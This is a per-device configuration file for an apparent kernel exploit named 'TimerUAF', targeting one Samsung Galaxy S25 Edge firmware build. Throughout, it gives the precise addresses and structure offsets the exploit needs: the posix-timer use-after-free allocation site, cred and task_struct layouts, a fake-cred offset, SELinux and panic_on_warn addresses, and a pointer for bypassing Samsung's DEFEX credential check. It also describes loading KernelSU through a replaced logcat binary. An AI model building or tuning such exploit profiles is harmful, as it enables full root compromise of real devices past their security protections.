# TimerUAF kernel profile: Samsung Galaxy S25 Edge (SM-S937B, Snapdragon)
#
# Samsung-specific mode, like samsung-s26fe-6.6.127.conf:
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - diabl0w/KernelSU Samsung build late-load via ksud over /system/bin/logcat
#   - SELinux left to ksud's own restore
#
# Kernel: 6.6.127-android15-8-p87b1ce1-abogkiS937BXXUBDZJB-4k (4K pages)
# AP    : S937BXXUBDZJB (EUX), Android 17, os_version_hdr 15.0.0, patch 2026-10
#
# All values below are derived from the factory boot.img of that build
# (sha256 92d60266452e1c5a55716e421da0e5f97c5d03eb80acac07043a7c5b94eff758,
# Image 6f84635078366d575e09c4ef0413327fecb0366147a90783c979153919cf67ec),
# kallsyms-reconstructed ELF (115126 symbols, base 0xffffffc080000000) and
# its .BTF (identical to the S25/S25+/S25 Ultra images; same 6.6 family
# layout as the s26fe profile, different text addresses — this is the
# p87b1ce1 S25-series build, not the S741B s26fe one).
#
# The prefix is the full banner so no other Samsung 6.6 build can match it:
# release_prefix_matches() cuts at '-' boundaries, and the S26 FE ships
# 6.6.127-android15-8-abogkiS741BXXS3AZK1-4k whose text addresses differ.
release_prefix = "6.6.127-android15-8-p87b1ce1-abogkiS937BXXUBDZJB-4k"
schema_version = 1
ksu_kmi = "android15-6.6"

# Samsung endgame switches (same contract as samsung-s26fe-6.6.127.conf).
samsung_mode = 1
samsung_package = "me.weishu.kernelsu"
# DEFEX creds_fast_hash: 8-byte pointer array indexed by pid (pid <= 0x8000
# indexes it directly, get_task_creds: cmp w, #0x8, lsl #12 / add x, x, x,
# lsl #3).  Own symbol at creds_hash + 0x40000 on this build.
defex_creds_hash = 0xffffffc082624f80

# 4K-page variant.
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) call site.
# init_posix_timers: mov w1, #0x108 (sizeof k_itimer, BTF agrees); the call
# loads x0 from 0xffffffc082581d60 (= posix_timers_cache), verified by
# dataflow (sitecheck.py).
timer_site = 0xffffffc0801962b0
timer_alloc = 0x108
# BTF k_itimer: it (struct cpu_timer, node first) at +0x78.
timer_node_off = 0x78

# cred_jar: cred_init: mov w1, #0xb8 (sizeof cred, BTF agrees); HWCACHE_ALIGN
# rounds the object to 0xc0.
cred_req = 0xb8
cred_alloc = 0xc0
cred_size = 0xb8
# 8-byte atomic_long usage on 6.6 (BTF: usage 0x0, uid 0x8, euid 0x18,
# securebits 0x28, cap_inheritable 0x30, security 0x80).
cred_uid_off = 0x8
cred_euid_off = 0x18
cred_cap_off = 0x30
cred_cap_count = 5
cred_security_off = 0x80
cred_user_off = 0x88
cred_userns_off = 0x90
cred_ucounts_off = 0x98
cred_group_off = 0xa0
# Distance from the stale k_itimer rb_node to the fake cred base.
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc0825a0810
panic_on_warn = 0xffffffc08233ac0c

# task_struct / cred layout (BTF: task_struct 0x12c0, cred field +0x820).
task_cred_off = 0x820
# dup_task_struct: bl kmem_cache_alloc_node(task_struct_cachep) at
# 0xffffffc0800ac470, called from copy_process+0x11c (bl 0xffffffc0800ab898);
# the return address low-21-bits is what the trace scan matches.
copy_process_low21 = 0xac474
# task_struct_vendor_size_setup exists (memparse gate, min 0x200) but the
# factory image does not set android_arch_task_struct_size, so no vendor
# extension.
task_alloc_bytes = 0x12c0

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc08235f220
init_user_ns = 0xffffffc08235ef90
init_ucounts = 0xffffffc082360d18
init_groups = 0xffffffc082360780

# task_security_struct: SELinux is the only cred-blob LSM here
# (effective order capability, safesetid, selinux, bpf, integrity; only
# selinux has a 32-byte lbs_cred).
selinux_blob_off = 0x0
selinux_sid_kernel = 1
